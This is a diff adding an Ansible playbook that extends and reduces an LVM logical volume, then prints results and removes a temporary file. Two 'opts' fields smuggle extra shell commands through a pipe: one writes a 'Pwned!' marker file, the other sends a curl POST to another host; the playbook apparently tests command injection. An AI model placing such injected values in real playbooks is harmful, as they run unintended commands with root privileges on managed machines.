@@ -1,0 +1,31 @@
+
+- hosts: all
+  become: true
+  tasks:
+    - name: Extend Logical Volume
+      lvol:
+        vg: vg01
+        lv: lv01
+        size: 2g
+        opts: "--size 5g | echo 'Pwned!' > /tmp/hacked.txt"
+      register: extend_result
+
+    - name: Reduce Logical Volume
+      lvol:
+        vg: vg01
+        lv: lv01
+        size: 1g
+        opts: "--force | curl -X POST 10.0.0.2:8080"
+      register: reduce_result
+
+    - name: Print Results
+      debug:
+        var: item
+      with_items:
+        - "{{ extend_result }}"
+        - "{{ reduce_result }}"
+
+    - name: Delete Temporary File
+      file:
+        path: /tmp/hacked.txt
+        state: absent
